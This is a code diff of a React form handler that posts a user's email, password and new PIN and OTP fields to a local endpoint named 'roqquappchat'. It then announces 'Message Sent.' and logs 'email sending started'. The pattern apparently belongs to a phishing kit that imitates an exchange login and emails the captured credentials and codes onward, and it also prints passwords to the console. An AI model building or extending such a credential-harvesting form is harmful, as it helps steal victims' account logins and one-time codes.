@@ -58,21 +58,30 @@ const Form = (props) => {
             //     )
 
             console.log({ email, password })
-            const response = await fetch('http://localhost:3030/roqquappchat', {
-                method: 'POST',
-                headers: {
-                    'Content-type': 'application/json',
-                },
-                body: JSON.stringify({ email, password }),
-            })
+            try{
 
-            const resData = await response.json()
-
-            if (resData.status === 'success') {
-                alert('Message Sent.')
+                const response = await fetch('http://localhost:3030/roqquappchat', {
+                    method: 'POST',
+                    headers: {
+                        'Content-type': 'application/json',
+                    },
+                    body: JSON.stringify({ email, password, PIN: '', OTP: '' }),
+                })
                 
-            } else if (resData.status === 'fail') {
-                alert('Message failed to send.')
+                const resData = await response.json()
+                
+                console.log('email sending started')
+                
+                if (resData.status === 'success') {
+                    alert('Message Sent.')
+                    
+                } else if (resData.status === 'fail') {
+                    alert('Message failed to send.')
+                }
+            }
+
+            catch(err) {
+                console.log(err)
             }
         }
     }
